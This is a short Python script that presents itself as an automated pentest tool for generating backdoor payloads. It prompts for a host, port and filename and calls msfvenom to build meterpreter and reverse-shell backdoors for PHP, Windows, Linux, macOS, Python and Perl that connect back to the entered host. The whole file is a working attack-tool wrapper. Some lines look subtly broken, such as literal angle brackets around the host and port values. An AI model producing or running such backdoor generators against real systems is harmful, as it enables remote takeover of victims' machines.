import os, time
import requests
from requests import post

print('''

  ____  _     __   __          _    _ _______ ____  __  __       _______ _____ _____ 
 |  _ \| |    \ \ / /     /\  | |  | |__   __/ __ \|  \/  |   /\|__   __|_   _/ ____|
 | |_) | |     \ V /     /  \ | |  | |  | | | |  | | \  / |  /  \  | |    | || |     
 |  _ <| |      > <     / /\ \| |  | |  | | | |  | | |\/| | / /\ \ | |    | || |     
 | |_) | |____ / . \   / ____ \ |__| |  | | | |__| | |  | |/ ____ \| |   _| || |____ 
 |____/|______/_/ \_\ /_/    \_\____/   |_|  \____/|_|  |_/_/    \_\_|  |_____\_____|
                                                                                     
                                                                                     
[Automatic backdoor list payloads, this is a automatized script for pentest uses]
[Payloads avaliable: [1] PHP, [2] WINDOWS, [3] LINUX, [4] MAC, [5] PYTHON, [6] PERL]
[Contact: N3wf4g#2717]


''')
start_time = time.time()
elapsed_time = time.time() - start_time
print('Loading Payloads')
time.sleep(0.5)
a=input('Host Adress > ')
b=input('Port > ')
c=input('Filename > ')
d=input('Choose a payload > ')
if d == '1':
    print('You choosed PHP exploit!')
    os.system('msfvenom -p php/meterpreter_reverse_tcp LHOST=<' + a + '> LPORT=<' + b + '> -f raw > ' + c + '.php')
elif d == '2':
    os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST=<' + a + '> LPORT=<' + b + '> -f exe > ' + c + '.exe')
elif d == '3':
    os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<' + a + '> LPORT=<' + b + '> -f elf > ' + c + '.elf')
elif d == '4':
    os.system('msfvenom -p osx/x86/shell_reverse_tcp LHOST=<' + a + '> LPORT=<' + b + '> -f macho > ' + c + '.macho')
elif d == '5':
    os.system('msfvenom -p cmd/unix/reverse_python LHOST=<' + a + '> LPORT=<' + b + '> -f raw > ' + c + '.py')
elif d == '6':
    os.system('msfvenom -p cmd/unix/reverse_perl LHOST=<' + a +'> LPORT=<' + b + '> -f raw > ' + c + '.pl')
else:
    os.system('clear')
    os.system('cls')
    print('Invalid Arguments #15420 [Crash]')
    exit()

